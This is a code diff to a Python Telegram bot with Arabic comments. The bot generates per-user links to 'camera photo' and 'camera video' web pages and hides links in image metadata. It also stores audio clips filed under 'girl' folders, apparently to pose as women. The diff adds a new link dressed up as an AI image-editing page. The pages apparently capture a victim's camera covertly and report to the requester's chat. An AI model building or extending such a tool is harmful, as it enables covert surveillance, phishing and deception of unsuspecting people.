@@ -18,9 +18,10 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # مسار قاعدة بيانات الأصوات الآمن على Railway
 DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"
 
-# الروابط المنفصلة والصحيحة تماماً
+# الروابط الخاصة بالخدمات
 PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
 VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
+IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"
 
 user_states = {}
 user_data = {}
@@ -69,18 +70,19 @@ def hide_link_in_metadata(image_path, link, output_path):
     except Exception as e:
         print(f"خطأ ميتاداتا: {e}")
 
-# --- لوحة التحكم الأساسية (القائمة العمودية الأصلية) ---
+# --- لوحة التحكم الأساسية المحدثة ---
 def get_main_keyboard():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
         types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
+        types.InlineKeyboardButton("✨ طلب رابط تعديل الصور", callback_data="get_image_edit_link"),
         types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
         types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
     )
     return markup
 
-# --- استقبال أمر البدء /start وتدمير الكيبورد السفلي ميكانيكياً ---
+# --- استقبال أمر البدء /start ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
@@ -112,6 +114,12 @@ def handle_query(call):
         link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"🎥 **رابط كاميرا الفيديو الخاص بك جاهز للفتح المباشر:**\n\n{link}", disable_web_page_preview=True)
         bot.answer_callback_query(call.id)
+
+    elif call.data == "get_image_edit_link":
+        # معالجة الزر الجديد وإرسال الرابط المطلوب
+        link = f"{IMAGE_EDIT_URL}?chatId={chat_id}"
+        bot.send_message(chat_id, f"✨ **رابط صفحة تعديل الصور بالذكاء الاصطناعي جاهز:**\n\n{link}", disable_web_page_preview=True)
+        bot.answer_callback_query(call.id)
         
     elif call.data == "voice_menu":
         markup = types.InlineKeyboardMarkup(row_width=1)
@@ -127,7 +135,7 @@ def handle_query(call):
         user_states[chat_id] = "active_girl_1"
         markup = types.InlineKeyboardMarkup(row_width=2)
         girl_db = db.get("girl_1", {})
-        for i in range(1, 11): # الفتاة 1 تحتوي على 10 مقاطع
+        for i in range(1, 11):
             name = f"مقطع {i}"
             status_emoji = "🎵" if name in girl_db else "⚪"
             markup.add(types.InlineKeyboardButton(f"{status_emoji} {name}", callback_data=f"play_g1:{name}"))
@@ -139,7 +147,7 @@ def handle_query(call):
         user_states[chat_id] = "active_girl_2"
         markup = types.InlineKeyboardMarkup(row_width=2)
         girl_db = db.get("girl_2", {})
-        for i in range(1, 14): # تم التعديل هنا لتظهر 13 مقطعاً كاملاً للفتاة 2
+        for i in range(1, 14):
             name = f"مقطع {i}"
             status_emoji = "🎵" if name in girl_db else "⚪"
             markup.add(types.InlineKeyboardButton(f"{status_emoji} {name}", callback_data=f"play_g2:{name}"))
@@ -187,11 +195,11 @@ def handle_all_media(message):
         db = load_db()
         if state == "active_girl_2":
             target = "girl_2"
-            max_slots = 13 # السعة القصوى المحددة للفتاة 2
+            max_slots = 13
             folder_name = "مجلد الفتاة 2"
         else:
             target = "girl_1"
-            max_slots = 10 # السعة القصوى للفتاة 1
+            max_slots = 10
             folder_name = "مجلد الفتاة 1"
 
         next_slot = len(db[target]) + 1
@@ -233,5 +241,5 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"تنبيه تهيئة: {e}")
 
-    print("🚀 البوت يعمل وجاهز، تم تحديث خانات الفتاة 2 لتستوعب 13 مقطعاً بنجاح...")
+    print("🚀 البوت يعمل وجاهز، تم إضافة ميزة رابط تعديل الصور الجديد بنجاح...")
     bot.polling(none_stop=True, interval=0, timeout=50)
